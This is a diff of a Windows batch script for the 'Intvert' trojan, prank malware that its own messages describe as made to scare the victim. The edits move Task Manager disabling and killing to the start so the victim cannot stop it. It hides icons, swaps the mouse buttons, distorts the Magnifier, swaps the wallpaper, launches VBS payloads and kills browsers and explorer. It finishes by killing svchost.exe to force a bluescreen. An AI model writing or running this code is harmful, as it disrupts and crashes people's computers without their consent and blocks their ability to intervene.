@@ -1,5 +1,13 @@
 @echo off
 title Intvert
+:: These scripts had to be moved to the front to make slower systems not be able to stop the program mid-setup
+REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+taskkill /f /im taskmgr.exe
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /V HideIcons /T REG_DWORD /D 1 /F
+:: Hide desktop icons, then restart explorer (makes the above script more reliable)
+taskkill /f /im explorer.exe
+start explorer.exe
+
 :: Creating a dir for all the "payloads" to be stored in
 del %userprofile%\Intvert /F /S /Q 
 cd %userprofile%
@@ -61,7 +69,6 @@ cd %userprofile%\desktop
   echo REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize /V SystemUsesLightTheme /T REG_DWORD /D 0 /F
   echo REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize /V EnableTransparency /T REG_DWORD /D 1 /F
   echo REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize /V AppsUseLightTheme /T REG_DWORD /D 0 /F) >RESTORE-PC-SRLY.bat
-REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
 REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v MagnifierUIWindowMinimized /t REG_DWORD /d 1 /f
 REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
 :: Now disable taskmgr, reset Magnifier magnification aswell as having it open minimized (/min dosen't work on magnifier)
@@ -207,7 +214,7 @@ cd %Userprofile%\Intvert
   echo goto a) >c.bat
 ( echo @echo off
   echo :check
-  echo set /a Rand=%%Random%% %%%%400
+  echo set /a Rand=%%Random%% %%%%200
   echo if %%Rand%%==%%chek%% goto check
   echo set /a chek=%%Rand%%
   echo REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d %%rand%% /f
@@ -261,7 +268,7 @@ cd %Userprofile%\Intvert
   echo cd %userprofile%\Intvert
   echo curl -o "haxr.jpg" https://image.freepik.com/free-vector/protection-against-hacker_106788-323.jpg
   echo reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f
-  echo reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d %%userprofile%%\haxr.jpg /f
+  echo reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d %%userprofile%%\Intvert\haxr.jpg /f
   echo reg add "HKEY_CURRENT_USER\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
   echo set lo=0
   echo :noea
@@ -404,20 +411,18 @@ cd %Userprofile%\Intvert
   echo Seccondly your computer has been infected by the Intvert tojan
   echo Have fun trying to use your computer, it won't last long
   echo.
-  echo Shutting down has a chance of harming yous system so I don't 
+  echo Shutting down has a chance of harming your system so I don't 
   echo reccomend it, just wait till the drop. Enjoy :D) >Yes.txt
-( echo.
-  echo So your computer has been trashed by the Intvert tojan
+( echo So your computer has been trashed by the Intvert tojan
   echo.
   echo You haven't rebooted which im guessing means you want to
   echo see more payloads, or your scared frozen and don't know what
-  echo to do, most people by now would've restarted but thats not you
-  echo This trojan isn't harmfull its made to scare you, this "trojan"
-  echo changes some reg keys and because of this a .bat has been made
-  echo on the desktop to re-enable taskmgr and reset magnifier.
+  echo to do, anyway. This "trojan" isn't harmfull, its just made to 
+  echo scare you, the program changes some reg keys and because of 
+  echo this a .bat has been made on the desktop to re-enable taskmgr 
+  echo and reset magnifier.
   echo.
-  echo Since your still here we might aswell give you a show
-  echo If this system is "low-end" its going to crash, if not
+  echo Since your still here we might aswell give you a show.
   echo Enjoy :D) >GiveItASec.txt
 
 ::-----------------------------------------------------------------------------------------------------------------------------------------------
@@ -442,17 +447,13 @@ cd %Userprofile%\Intvert
 ::-----------------------------------------------------------------------------------------------------------------------------------------------
 rundll32.exe %SystemRoot%\system32\shell32.dll,Control_RunDLL %SystemRoot%\system32\desk.cpl desk,@Themes /Action:OpenTheme /file:"C:\Windows\Resources\Themes\aero.theme"
 :: Change windows theme (Spooky)
-REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /V HideIcons /T REG_DWORD /D 1 /F
-:: Hide desktop icons, then restart explorer (makes the ablove script more reliable)
-taskkill /f /im explorer.exe
-start explorer.exe
 Rundll32 user32,SwapMouseButton
 :: Do I need to explain what this dose (Swap mouse buttons)
 start s7.vbs
-start trk.vbs
+start Divide.vbs
 start Yes.txt
 :: Open a txt document tring to scare the user
-timeout /t 28 /nobreak
+timeout /t 29 /nobreak
 :: Fun fact: Without error the next payload is timed with the drop of the song
 start S2.vbs
 start S6.vbs
@@ -466,10 +467,10 @@ start S4.vbs
 timeout /t 36 /nobreak
 start S5.vbs 
 timeout /t 36 /nobreak
-taskkill /F /IM wscript.exe
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /V HideIcons /T REG_DWORD /D 0 /F
 taskkill /f /im explorer.exe
 start explorer.exe
+taskkill /F /IM wscript.exe
 REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
 for /f "usebackq tokens=2 delims=," %%a in (`tasklist /NH /v /fo csv /FI "IMAGENAME eq cmd.exe" /FI "STATUS eq running" ^| FIND /I "Intvert"`) do ( TASKKILL /F /FI "PID ne %%~a" /FI "IMAGENAME eq cmd.exe" /IM cmd.exe)
 TASKKILL /F /IM explorer.exe
@@ -480,25 +481,21 @@ TASKKILL /F /IM Magnify.exe
 :: Attempt to kill all current payloads to "talk" to the user
 start /max GiveItASec.txt
 timeout /t 32 /nobreak
+TASKKILL /F /IM notepad.exe
 start explorer.exe
+start v.vbs
 start S2.vbs
+start S3.vbs
 start Cheeta.vbs 
 timeout /t 16 /nobreak 
 :: SLOW THIS SHIT DOWN
 start S8.vbs
-timeout /t 48 /nobreak
+timeout /t 10 /nobreak
+start end.vbs
+timeout /t 38 /nobreak
 :: LETS FINNISH THIS PC
 taskkill /f /im explorer.exe
-REG add HKEY_CURRENT_USER\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
-for /f "usebackq tokens=2 delims=," %%a in (`tasklist /NH /v /fo csv /FI "IMAGENAME eq cmd.exe" /FI "STATUS eq running" ^| FIND /I "Intvert"`) do ( TASKKILL /F /FI "PID ne %%~a" /FI "IMAGENAME eq cmd.exe" /IM cmd.exe)
-TASKKILL /F /IM explorer.exe
-TASKKILL /F /IM firefox.exe
-TASKKILL /F /IM chrome.exe
-TASKKILL /F /IM MicrosoftEdge.exe
-TASKKILL /F /IM Magnify.exe
-taskkill /F /IM wscript.exe
-start end.vbs
-timeout /t 4 /nobreak
+timeout /t 16 /nobreak
 :win10
 taskkill /F /Im svchost.exe
 :: Bluescreen (Win10 only, I think)
